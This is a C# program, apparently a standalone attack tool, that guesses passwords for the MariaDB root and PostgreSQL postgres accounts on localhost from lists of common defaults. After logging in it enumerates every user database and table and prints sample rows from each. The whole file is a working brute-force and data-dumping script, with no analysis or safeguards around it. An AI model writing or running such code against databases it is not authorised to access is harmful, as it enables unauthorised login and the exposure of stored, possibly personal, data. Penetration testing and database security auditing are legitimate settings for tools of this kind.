using System;
using System.Collections.Generic;
using MySqlConnector;
using Npgsql;

class Program
{
    static void Main()
    {
        Console.WriteLine("=== BRUTE FORCING DB CONNECTION ===");

        string[] mariadbPasswords = { "", "root", "admin", "1234", "123456", "password", "mariadb", "mysql" };
        string[] postgresPasswords = { "postgres", "admin", "1234", "123456", "password", "root", "" };

        // 1. Try MariaDB
        bool mariaSuccess = false;
        foreach (var pass in mariadbPasswords)
        {
            try
            {
                string connStr = $"Server=localhost;Port=3306;User=root;Password={pass};";
                using var conn = new MySqlConnection(connStr);
                conn.Open();
                Console.WriteLine($"\n[MariaDB] Connected successfully with password: '{pass}'");
                mariaSuccess = true;
                DumpMariaDB(conn, pass);
                break;
            }
            catch {}
        }
        if (!mariaSuccess) Console.WriteLine("[MariaDB] Failed to connect with common passwords.");

        // 2. Try PostgreSQL
        bool pgSuccess = false;
        foreach (var pass in postgresPasswords)
        {
            try
            {
                string connStr = $"Host=localhost;Port=5432;Database=postgres;Username=postgres;Password={pass};";
                using var conn = new NpgsqlConnection(connStr);
                conn.Open();
                Console.WriteLine($"\n[PostgreSQL] Connected successfully with password: '{pass}'");
                pgSuccess = true;
                DumpPostgres(conn, pass);
                break;
            }
            catch {}
        }
        if (!pgSuccess) Console.WriteLine("[PostgreSQL] Failed to connect with common passwords.");
    }

    static void DumpMariaDB(MySqlConnection conn, string pass)
    {
        using var cmd = new MySqlCommand("SHOW DATABASES;", conn);
        using var r = cmd.ExecuteReader();
        var dbs = new List<string>();
        while (r.Read()) dbs.Add(r.GetString(0));
        r.Close();
        
        foreach (var db in dbs)
        {
            if (db == "information_schema" || db == "mysql" || db == "performance_schema" || db == "sys") continue;
            Console.WriteLine($"Database: {db}");
            using var connDb = new MySqlConnection($"Server=localhost;Port=3306;Database={db};User=root;Password={pass};");
            connDb.Open();
            using var cmdT = new MySqlCommand("SHOW TABLES;", connDb);
            using var rT = cmdT.ExecuteReader();
            var tables = new List<string>();
            while (rT.Read()) tables.Add(rT.GetString(0));
            rT.Close();
            
            foreach (var table in tables)
            {
                Console.WriteLine($"  Table: {table}");
                using var cmdS = new MySqlCommand($"SELECT * FROM `{table}` LIMIT 3;", connDb);
                using var rS = cmdS.ExecuteReader();
                for (int i = 0; i < rS.FieldCount; i++)
                {
                    Console.Write($"{rS.GetName(i)} ({rS.GetFieldType(i).Name}) | ");
                }
                Console.WriteLine();
                while (rS.Read())
                {
                    for (int i = 0; i < rS.FieldCount; i++)
                    {
                        Console.Write($"{rS.GetValue(i)} | ");
                    }
                    Console.WriteLine();
                }
            }
        }
    }

    static void DumpPostgres(NpgsqlConnection conn, string pass)
    {
        using var cmd = new NpgsqlCommand("SELECT datname FROM pg_database WHERE datistemplate = false AND datallowconn = true;", conn);
        using var r = cmd.ExecuteReader();
        var dbs = new List<string>();
        while (r.Read()) dbs.Add(r.GetString(0));
        r.Close();

        foreach (var db in dbs)
        {
            Console.WriteLine($"Database: {db}");
            string dbConnStr = $"Host=localhost;Port=5432;Database={db};Username=postgres;Password={pass};";
            using var connDb = new NpgsqlConnection(dbConnStr);
            connDb.Open();
            
            using var cmdT = new NpgsqlCommand(
                "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';", connDb);
            using var rT = cmdT.ExecuteReader();
            var tables = new List<string>();
            while (rT.Read()) tables.Add(rT.GetString(0));
            rT.Close();

            foreach (var table in tables)
            {
                Console.WriteLine($"  Table: {table}");
                using var cmdS = new NpgsqlCommand($"SELECT * FROM \"{table}\" LIMIT 3;", connDb);
                using var rS = cmdS.ExecuteReader();
                for (int i = 0; i < rS.FieldCount; i++)
                {
                    Console.Write($"{rS.GetName(i)} ({rS.GetFieldType(i).Name}) | ");
                }
                Console.WriteLine();
                while (rS.Read())
                {
                    for (int i = 0; i < rS.FieldCount; i++)
                    {
                        Console.Write($"{rS.GetValue(i)} | ");
                    }
                    Console.WriteLine();
                }
            }
        }
    }
}
